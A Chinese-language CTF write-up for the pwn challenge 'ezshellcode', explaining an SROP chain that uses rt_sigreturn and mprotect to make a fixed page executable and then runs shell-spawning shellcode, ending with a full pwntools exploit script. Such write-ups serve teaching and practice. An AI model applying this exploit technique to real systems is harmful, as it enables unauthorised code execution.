---
layout: post
title: "ezshellcode"
date: 2026-10-07 20:05:00 +0800
tags: ["CTF", "Write-up"]
description: "Notes and solution for ezshellcode from ctf+ (2026)."
source_folder: "Write-ups/2026/ctf+"
lang: zh-CN
---
{% raw %}

## 信息
```
	arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)

无glibc
```

# 反编译
程序是 64 位静态 ELF，入口处只有一小段代码：

```asm
0x4000b0: xor rax, rax
0x4000b3: mov edx, 0x400
0x4000b8: mov rsi, rsp
0x4000bb: mov rdi, rax
0x4000be: syscall
0x4000c0: ret
```

等价于：

```c
read(0, rsp, 0x400);
ret;
```

程序无 PIE，代码基址固定为 `0x400000`，NX 开启，栈不可执行。可用 gadget 只有 `syscall; ret` 和重新执行 `read` 的入口。

# 思路

## step1
输入覆盖栈顶返回地址为 `0x4000b0`，让程序再执行一次 `read(0, rsp, 0x400)`。

## step2
第二次输入长度严格控制为 15 字节，使 `read` 返回值 `rax=15`，随后返回到 `syscall; ret`，触发 `rt_sigreturn`。因为这 15 字节会覆盖 sigreturn frame 开头 7 字节，所以后 7 字节填 `bytes(frame)[:7]` 来保持 frame 不被破坏。

sigreturn frame 设置：

```text
rax = SYS_mprotect
rdi = 0x400000
rsi = 0x1000
rdx = 7
rsp = 0x400018
rip = 0x4000be
```

执行后调用：

```c
mprotect(0x400000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC);
```

## step3
```
LOAD:0000000000400006                 db 1                    ; File version
LOAD:0000000000400007                 db 0                    ; OS/ABI: UNIX System V ABI
LOAD:0000000000400008                 db 0                    ; ABI Version
LOAD:0000000000400009                 db 7 dup(0)             ; Padding
LOAD:0000000000400010                 dw 2                    ; File type: Executable
LOAD:0000000000400012                 dw 3Eh                  ; Machine: x86-64
LOAD:0000000000400014                 dd 1                    ; File version
LOAD:0000000000400018                 dq offset start         ; Entry point
LOAD:0000000000400020                 dq 40h                  ; PHT file offset
LOAD:0000000000400028                 dq 0D8h                 ; SHT file offset
LOAD:0000000000400030                 dd 0   
```

`0x400018` 处的 ELF 头字段刚好保存了入口地址 `0x4000b0`，所以 `mprotect` 后的 `ret` 会回到 `read`。此时第三次输入写到固定地址 `0x400020`，再返回到 `0x400028` 执行 shellcode。

由于返回 shellcode 时 `rsp=0x400028`，普通 `shellcraft.sh()` 的 `push` 会向上写到未映射的 `0x3ffff8`。因此 shellcode 开头先执行：

```asm
add rsp,0x600
```

把栈放到已经被 `mprotect` 成 RWX 的页内。

# exp
```python
def pwn():
    start = 0x4000B0
    syscall_ret = 0x4000BE
    start_p = 0x400018
    
    frame = SigreturnFrame()
    frame.rax = constants.SYS_mprotect
    frame.rdi = 0x400000
    frame.rsi = 0x1000
    frame.rdx = 7
    frame.rsp = start_p
    frame.rip = syscall_ret
    
    payload = flat(
        start,
        b'a'*8,
        bytes(frame),
    )
    
    s(payload)
    
    payload = p64(syscall_ret) + bytes(frame)[:7]      # 15
    s(payload)
    
    sc = asm('add rsp,0x600\n'+shellcraft.sh())
    payload = flat(
        start_p + 0x10,
        sc,
    )
    dbg()
    s(payload)
    ia()
```
{% endraw %}
